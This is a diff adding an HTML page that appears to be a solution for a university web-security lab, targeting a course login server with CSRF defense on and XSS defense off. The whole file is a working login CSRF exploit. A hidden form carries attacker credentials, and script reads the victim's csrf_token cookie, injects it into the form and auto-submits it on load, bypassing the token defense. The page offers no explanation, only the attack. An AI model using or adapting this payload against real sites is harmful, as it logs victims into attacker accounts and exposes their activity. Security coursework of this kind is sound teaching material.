@@ -1,0 +1,26 @@
+<form action="http://trurl.cs.illinois.edu/login?csrfdefense=1&xssdefense=0" id="login" method="post">
+    <input type="hidden" name="csrf_token" value="">
+    <input type="hidden" name="username" value="attacker">
+    <input type="hidden" name="password" value="l33th4x">
+</form>
+
+<script src=http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js></script>
+<script>
+function getCookie(cname, ck) {
+    var name = cname + "=";
+    var decodedCookie = decodeURIComponent(ck);
+    var ca = decodedCookie.split(';');
+    for(var i = 0; i < ca.length; i++) {
+        var c = ca[i];
+        while (c.charAt(0) == ' ') {
+            c = c.substring(1);
+        }
+        if (c.indexOf(name) == 0) {
+            return c.substring(name.length, c.length);
+        }
+    }
+    return "";
+}
+    $('input[name="csrf_token"]').val(getCookie("csrf_token", document.cookie));
+    document.getElementById("login").submit();
+</script>
